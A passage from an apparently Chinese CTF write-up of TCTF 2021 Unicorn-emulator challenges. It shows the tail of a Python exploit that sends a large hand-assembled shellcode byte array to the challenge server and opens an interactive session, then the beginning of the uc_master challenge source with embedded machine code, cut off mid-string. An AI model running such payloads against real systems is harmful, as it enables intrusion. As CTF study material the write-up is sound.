class="hljs-number">0x16</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x0C</span>]<br><br><br>code = bytes(code)<br>code = code<span class="hljs-number">.</span>rjust(<span class="hljs-number">0x2000</span>, b<span class="hljs-string">&#x27;\x66&#x27;</span>)<br>print(<span class="hljs-string">&quot;code len:&quot;</span>, hex(len(code)))<br>p = remote(<span class="hljs-string">&#x27;111.186.59.29&#x27;</span>, <span class="hljs-number">10086</span>)<br>p<span class="hljs-number">.</span>send(code)<br>p<span class="hljs-number">.</span>interactive()<br></code></pre></td></tr></table></figure>

<h2 id="uc-master"><a href="#uc-master" class="headerlink" title="uc_master"></a>uc_master</h2><p>题目下载:  <a href="/2021/07/06/TCTF2021-uc-master-uc-baaby-FEA/uc_masteeer.zip" title="uc_masteeer.zip">uc_masteeer.zip</a></p>
<p>题目代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> types<br><span class="hljs-keyword">from</span> unicorn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> unicorn.x86_const <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">from</span> syscall <span class="hljs-keyword">import</span> hook_syscall<br><br><br>CODE = <span class="hljs-number">0xdeadbeef000</span><br>STACK = <span class="hljs-number">0xbabecafe000</span><br>MAIN = <span class="hljs-string">b&#x27;\x48\x83\xec\x20\x66\xc7\x44\x24\x0e\x00\x00\x48\x8d\x5c\x24\x0e\x48\xc7\x44\x24\x10\x00\x00\x00\x00\x48\xc7\x44\x24\x18\x00\x00\x00\x00\xb9\x44\x00\x00\x00\x48\x8d\x15\x8b\x01\x00\x00\xbe\x01\x00\x00\x00\x31\xc0\xbf\x01\x00\x00\x00\xe8\xbe\x01\x00\x00\xb9\x02\x00\x00\x00\x48\x89\xda\x31\xf6\x31\xff\x31\xc0\xe8\xab\x01\x00\x00\x8a\x44\x24\x0e\x3c\x32\x74\x39\x3c\x33\x74\x62\x3c\x31\x0f\x85\x04\x01\x00\x00\xb9\x12\x00\x00\x00\x48\x8d\x15\x35\x01\x00\x00\xbe\x01\x00\x00\x00\x31\xc0\xbf\x01\x00\x00\x00\xe8\x7a\x01\x00\x00\x48\x83\xc4\x20\x48\xbf\x00\xe0\xaf\xec\xab\x0b\x00\x00\xff\x27\xb9\x12\x00\x00\x00\x48\x8d\x15\xf6\x00\x00\x00\xbe\x01\x00\x00\x00\x31\xc0\xbf\x01\x00\x00\x00\xe8\x4d\x01\x00\x00\x48\x83\xc4\x20\x48\xbf\x00\xe0\xaf\xec\xab\x0b\x00\x00\xff\x27\xb9\x07\x00\x00\x00\x48\x8d\x15\xc2\x00\x00\x00\xbe\x01\x00\x00\x00\x31\xc0\xbf\x01\x00\x00\x00\xe8\x20\x01\x00\x00\x31\xf6\x31\xff\x48\x8d\x54\x24\x10\xb9\x08\x00\x00\x00\x31\xc0\xe8\x0b\x01\x00\x00\xb9\x07\x00\x00\x00\xbe\x01\x00\x00\x00\x31\xc0\x48\x8d\x15\x82\x00\x00\x00\xbf\x01\x00\x00\x00\xe8\xee\x00\x00\x00\x31\xf6\x31\xff\x31\xc0\x48\x8d\x54\x24\x18\xb9\x08\x00\x00\x00\xe8\xd9\x00\x00\x00\x48\x81\x7c\x24\x18\xff\x00\x00\x00\x0f\x87\xef\xfe\xff\xff\xb9\x07\x00\x00\x00\x48\x8d\x15\x41\x00\x00\x00\xbe\x01\x00\x00\x00\x31\xc0\xbf\x01\x00\x00\x00\xe8\xad\x00\x00\x00\x48\x8b\x4c\x24\x18\x31\xf6\x31\xff\x48\x8b\x54\x24\x10\x31\xc0\xe8\x98\x00\x00\x00\xe9\xb8\xfe\xff\xff\xbe\xff\x00\x00\x00\xbf\x3c\x00\x00\x00\x31\xc0\xe8\x82\x00\x00\x00\xe9\xa2\xfe\xff\xff\x64\x61\x74\x61\x3a\x20\x00\x73\x69\x7a\x65\x3a\x20\x00\x61\x64\x64\x72\x3a\x20\x00\x50\x61\x74\x68\x65\x74\x69\x63\x20\x68\x75\x6d\x61\x6e\x20\x3e\x0a\x00\x50\x6f\x77\x65\x72\x66\x75\x6c\x20\x61\x64\x6d\x69\x6e\x20\x3e\x0a\x00\x57\x65\x6c\x63\x6f\x6d\x65\x20\x74\x6f\x20\x75\x63\x5f\x6d\x61\x73\x74\x65\x65\x65\x72\x0a\x31\x2e\x20\x61\x64\x6d\x69\x6e\x20\x74\x65\x73\x74\x0a\x32\x2e\x20\x75\x73\x65\x72\x20\x74\x65\x73\x74\x0a\x33\x2e\x20\x70\x61\x74\x63\x68\x20\x64\x61\x74\x61\x0a\x3f\x3a